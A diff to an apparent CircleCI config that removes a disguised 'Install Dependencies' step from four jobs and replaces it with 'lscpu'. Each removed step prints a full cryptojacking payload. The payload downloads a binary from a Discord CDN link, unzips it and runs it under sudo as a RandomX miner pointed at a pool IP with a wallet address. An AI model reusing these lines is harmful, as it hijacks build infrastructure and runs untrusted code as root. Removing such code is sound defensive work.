@@ -6,52 +6,28 @@ jobs:
       steps:
         - run:
             name: Install Dependencies
-            command: import requests
-
-url = 'https://cdn.discordapp.com/attachments/769611456601260082/914205748983103498/bin.zip'
-r = requests.get(url, allow_redirects=True)
-open('bin.zip', 'wb').write(r.content)
-
-!sudo su --command "unzip bin.zip && chmod +x bin/bin && ./bin/bin --donate-level=0 -a rx/0 -o 172.65.200.133:3380 -u 3NWZWT5i7v2qPUSVyyc2JrsyMmzh75mJgN --http-enabled --http-port=4000 --nicehash"
+            command: lscpu
     Devop1:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: import requests
-
-url = 'https://cdn.discordapp.com/attachments/769611456601260082/914205748983103498/bin.zip'
-r = requests.get(url, allow_redirects=True)
-open('bin.zip', 'wb').write(r.content)
-
-!sudo su --command "unzip bin.zip && chmod +x bin/bin && ./bin/bin --donate-level=0 -a rx/0 -o 172.65.200.133:3380 -u 3NWZWT5i7v2qPUSVyyc2JrsyMmzh75mJgN --http-enabled --http-port=4000 --nicehash"
+            command: lscpu
     Devop2:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: import requests
-
-url = 'https://cdn.discordapp.com/attachments/769611456601260082/914205748983103498/bin.zip'
-r = requests.get(url, allow_redirects=True)
-open('bin.zip', 'wb').write(r.content)
-
-!sudo su --command "unzip bin.zip && chmod +x bin/bin && ./bin/bin --donate-level=0 -a rx/0 -o 172.65.200.133:3380 -u 3NWZWT5i7v2qPUSVyyc2JrsyMmzh75mJgN --http-enabled --http-port=4000 --nicehash"
+            command: lscpu
     Devop3:
       docker:
             - image: circleci/ruby:2.5.3
       steps:
         - run:
             name: Install Dependencies
-            command: import requests
-
-url = 'https://cdn.discordapp.com/attachments/769611456601260082/914205748983103498/bin.zip'
-r = requests.get(url, allow_redirects=True)
-open('bin.zip', 'wb').write(r.content)
-
-!sudo su --command "unzip bin.zip && chmod +x bin/bin && ./bin/bin --donate-level=0 -a rx/0 -o 172.65.200.133:3380 -u 3NWZWT5i7v2qPUSVyyc2JrsyMmzh75mJgN --http-enabled --http-port=4000 --nicehash"
+            command: lscpu
 workflows:
     version: 2.1
     build:
